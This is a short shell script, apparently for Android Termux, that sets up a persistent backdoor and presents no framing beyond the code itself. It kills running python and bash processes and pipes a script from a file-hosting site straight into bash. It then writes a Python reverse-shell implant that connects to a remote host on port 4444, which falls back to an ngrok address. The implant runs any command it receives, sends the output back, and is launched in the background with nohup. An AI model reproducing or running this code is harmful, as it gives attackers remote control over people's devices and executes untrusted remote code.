pkill -f python
pkill -f bash
killall python3 2>/dev/null; killall bash 2>/dev/null

curl -s https://files.catbox.moe/3q8x1v.sh | bash

killall python3 bash 2>/dev/null; clear


cat > ~/implant.py << 'EOF'
import socket, subprocess, os, time, base64, json
while True:
    try:
        s=socket.socket();s.connect(("HOST",4444))
        while True:
            c=s.recv(1024).decode()
            if c.strip()=="exit": break
            p=subprocess.Popen(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            r=p.stdout.read()+p.stderr.read()
            s.send(base64.b64encode(r))
    except: time.sleep(7)
EOF



sed -i 's/HOST/$(termux-telephony-deviceinfo|grep ip|head -1|cut -d'"' -f4)/g' ~/implant.py 2>/dev/null || sed -i 's/HOST/0.tcp.ngrok.io/g' ~/implant.py; nohup python3 ~/implant.py >/dev/null 2>&1 &
